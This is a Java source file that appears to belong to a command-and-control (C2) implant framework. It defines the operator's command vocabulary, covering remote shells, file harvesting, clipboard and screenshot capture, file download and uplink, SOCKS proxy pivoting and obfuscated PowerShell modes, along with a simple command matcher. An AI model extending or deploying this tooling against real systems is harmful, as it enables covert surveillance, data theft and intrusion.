package c2;

public class Commands {
	public static String CLIENT_CMD_PWD = "pwd";
	public static String CLIENT_CMD_CD = "cd";
	public static String CLIENT_CMD_RM = "rm";
	public static String CLIENT_CMD_DEL = "del";
	public static String CLIENT_CMD_RMDIR = "rmdir";
	public static String CLIENT_CMD_MKDIR = "mkdir";
	public static String CLIENT_CMD_COPY = "cp";
	public static String CLIENT_CMD_MOVE = "mv";
	
	public static String CLIENT_CMD_SHUTDOWN_DAEMON = "die";
	
	public static String CLIENT_CMD_HARVEST_CURRENT_DIRECTORY = "harvest_pwd";
	
	public static String CLIENT_CMD_OS_HERITAGE = "os_heritage";
	public static String OS_HERITAGE_RESPONSE_WINDOWS = "Windows";
	public static String OS_HERITAGE_RESPONSE_LINUX = "Linux";
	public static String OS_HERITAGE_RESPONSE_MAC = "Mac";
	
	public static final String CLIENT_CMD_GET_EXE = "get_daemon_start_cmd";
	
	public static final String CLIENT_CMD_SHELL_BACKGROUND = "shell_background";
	public static final String CLIENT_CMD_SHELL_KILL = "shell_kill";
	public static final String CLIENT_CMD_SHELL = "shell";
	public static final String CLIENT_CMD_SHELL_LIST = "shell_list";
	
	public static final String CLIENT_CMD_GETUID = "getuid";
	
	public static final String CLIENT_CMD_LIST_ACTIVE_HARVESTS = "listActiveHarvests";
	public static final String CLIENT_CMD_KILL_ALL_HARVESTS = "kill_all_harvests";
	public static final String CLIENT_CMD_KILL_HARVEST = "kill_harvest";
	
	public static final String CLIENT_CMD_CLIPBOARD = "clipboard";
	
	public static final String CLIENT_CMD_SCREENSHOT = "screenshot";
	
	public static final String CLIENT_CMD_KILL_SOCKS_5 = "killSocks5";
	
	public static final String CLIENT_CMD_WHERE = "where";
	public static final String CLIENT_CMD_CAT = "cat";
	public static final String CLIENT_CMD_DOWNLOAD = "<control> download";
	public static final String CLIENT_CMD_UPLINK = "uplink";
	
	public static final String CLIENT_CMD_PROXY = "proxy";
	public static final String CLIENT_CMD_KILL_PROXY = "killproxy";
	public static final String CLIENT_CMD_CONFIRM_CLIENT_PROXY = "confirm_client_proxy";
	public static final String CLIENT_CMD_KILL_SOCKS = "killSocks";
	public static final String CLIENT_CMD_START_SOCKS5 = "startSocks5";
	public static final String CLIENT_CMD_START_SOCKS = "startSocks";
	
	public static final String SERVER_CMD_LIST_ALL_MACROS = "list_macros";
	
	public static final String SESSION_START_OBFUSCATE_WINDOWS_COMMAND = "<start esc>";
	public static final String SESSION_END_OBFUSCATE_WINDOWS_COMMAND = "<end esc>";
	public static final String SESSION_OBFUSCATE_WINDOWS_COMMAND_PREFIX = "<esc> ";
	
	public static final String SESSION_START_OBFUSCATED_POWERSHELL_MODE = "<ps-start>";
	public static final String SESSION_END_OBFUSCATED_POWERSHELL_MODE = "<ps-end>";
	
	public static boolean isClientCommand(String cmd) {
		//Make this more readable...
		if(cmd.equals(CLIENT_CMD_PWD)) {
			return true;
		}else if(cmd.startsWith(CLIENT_CMD_CD + " ")) {
			return true;
		}else if(cmd.startsWith(CLIENT_CMD_RM + " ")) {
			return true;
		}else if(cmd.startsWith(CLIENT_CMD_DEL + " ")) {
			return true;
		}else if(cmd.startsWith(CLIENT_CMD_MKDIR + " ")) {
			return true;
		}else if(cmd.startsWith(CLIENT_CMD_RMDIR + " ")) {
			return true;
		}else if(cmd.equals(CLIENT_CMD_SHUTDOWN_DAEMON)) {
			return true;
		}else if(cmd.equals(CLIENT_CMD_HARVEST_CURRENT_DIRECTORY)) {
			return true;
		}else if(cmd.equals(CLIENT_CMD_OS_HERITAGE)) {
			return true;
		}else if(cmd.equals(CLIENT_CMD_GET_EXE)) {
			return true;
		}else if(cmd.equals(CLIENT_CMD_SHELL_BACKGROUND)) {
			return true;
		}else if(cmd.equals(CLIENT_CMD_SHELL) || cmd.startsWith(CLIENT_CMD_SHELL + " ")) {
			return true;
		}else if(cmd.equals(CLIENT_CMD_SHELL_KILL) || cmd.startsWith(CLIENT_CMD_SHELL_KILL + " ")) {
			return true;
		}else if(cmd.equals(CLIENT_CMD_SHELL_LIST)) {
			return true;
		}else if(cmd.equals(CLIENT_CMD_GETUID)) {
			return true;
		}else if(cmd.equals(CLIENT_CMD_LIST_ACTIVE_HARVESTS)) {
			return true;
		}else if(cmd.equals(CLIENT_CMD_KILL_ALL_HARVESTS)) {
			return true;
		}else if(cmd.equals(CLIENT_CMD_CLIPBOARD)) {
			return true;
		}else if(cmd.equals(CLIENT_CMD_SCREENSHOT)) {
			return true;
		}else if(cmd.equals(CLIENT_CMD_KILL_SOCKS_5)) {
			return true;
		}else if(cmd.startsWith(CLIENT_CMD_KILL_HARVEST + " ")) {
			return true;
		}else if(cmd.startsWith(CLIENT_CMD_WHERE + " ")) {
			return true;
		}else if(cmd.startsWith(CLIENT_CMD_CAT + " ")) {
			return true;
		}else if(cmd.startsWith(CLIENT_CMD_DOWNLOAD + " ")) {
			return true;
		}else if(cmd.startsWith(CLIENT_CMD_UPLINK + " ")) {
			return true;
		}else if(cmd.startsWith(CLIENT_CMD_PROXY + " ")) {
			return true;
		}else if(cmd.startsWith(CLIENT_CMD_KILL_PROXY + " ")) {
			return true;
		}else if(cmd.startsWith(CLIENT_CMD_CONFIRM_CLIENT_PROXY + " ")) {
			return true;
		}else if(cmd.startsWith(CLIENT_CMD_KILL_SOCKS + " ")) {
			return true;
		}else if(cmd.startsWith(CLIENT_CMD_START_SOCKS5 + " ")) {
			return true;
		}else if(cmd.startsWith(CLIENT_CMD_START_SOCKS + " ")) {
			return true;
		}
	
		return false;
	}
}
